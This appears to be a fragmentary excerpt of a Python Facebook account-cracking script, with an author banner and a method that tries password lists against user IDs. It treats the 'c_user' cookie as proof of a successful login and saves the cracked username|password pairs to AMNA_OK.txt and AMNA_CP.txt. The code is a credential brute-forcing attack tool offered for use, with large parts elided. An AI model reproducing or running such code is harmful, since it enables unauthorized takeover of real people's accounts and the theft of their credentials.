...
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m AMNA

\033[1;31m\033[1;37m Facebook\x1b[1;97m :  \033[1;37m THE SARDAR

\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m Shane404207
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[AMNA] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AMNA-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('AMNA_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [AMNA-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('AMNA_CP.txt' , 'a').write('%s\n' % wrt)
